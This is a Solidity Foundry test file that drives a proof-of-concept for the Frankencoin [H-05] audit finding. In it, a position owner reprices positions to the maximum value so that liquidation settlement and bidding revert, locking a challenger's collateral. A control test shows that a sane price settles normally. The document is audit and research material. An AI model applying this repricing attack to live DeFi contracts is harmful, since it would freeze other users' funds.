// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./20020-h-05-position-owners-can-deny-liquidations-code4rena-franken.sol";

/*//////////////////////////////////////////////////////////////////////////
    Frankencoin [H-05] — Position owners can deny liquidations.

    Driver test for the cheatcode-free synthetic. It runs the attack (owner
    reprices two positions to type(uint256).max) and independently re-asserts the
    harm: both the settlement path (`end`) and the averting path (`bid`) revert, so
    the challenger's escrowed collateral is permanently locked in the hub. A
    control shows that with a sane price the same `end` flow settles and returns
    the collateral — proving the overflow is what bricks liquidation.
//////////////////////////////////////////////////////////////////////////*/
contract DenyLiquidationsTest is Test {
    function test_maxPrice_locks_challenger_collateral() public {
        Exploit exp = new Exploit();
        CollateralToken token = exp.token();
        MintingHub hub = exp.hub();
        Challenger challenger = exp.challenger();

        // Baseline: challenger holds its escrow, hub holds nothing.
        assertEq(token.balanceOf(address(challenger)), exp.LOCKED_TOTAL(), "challenger funded");
        assertEq(token.balanceOf(address(hub)), 0, "hub empty pre-attack");

        // === attack: reprice to max -> challenge -> end/bid both revert ===
        exp.run();

        // HARM — both resolution paths are bricked ...
        assertTrue(exp.endReverted(), "end() reverted (settlement impossible)");
        assertTrue(exp.bidReverted(), "bid() reverted (cannot avert)");

        // ... and the challenger's entire escrow is locked in the hub.
        assertEq(token.balanceOf(address(hub)), exp.LOCKED_TOTAL(), "escrow locked in hub");
        assertEq(token.balanceOf(address(challenger)), 0, "challenger cannot recover collateral");
    }

    /// @notice Control: with a SANE liquidation price the settlement path does not
    ///         overflow — `end` succeeds and the challenger's collateral is
    ///         returned. This isolates the unbounded price as the root cause.
    function test_sanePrice_end_settles_and_returns_collateral() public {
        CollateralToken token = new CollateralToken();
        MintingHub hub = new MintingHub();
        // Sane price 1e18, zero challenge period so end() is callable now.
        Position pos = new Position(address(this), address(hub), address(token), 0, 1e18);
        Challenger challenger = new Challenger(token, hub);

        token.mint(address(pos), 1e18);
        token.mint(address(challenger), 1e18);

        uint256 id = challenger.challenge(pos, 1e18);
        assertEq(token.balanceOf(address(hub)), 1e18, "escrowed");

        // No overflow at a sane price: end() settles and returns the collateral.
        hub.end(id);
        assertEq(token.balanceOf(address(hub)), 0, "hub released escrow");
        assertEq(token.balanceOf(address(challenger)), 1e18, "challenger made whole at sane price");
    }
}
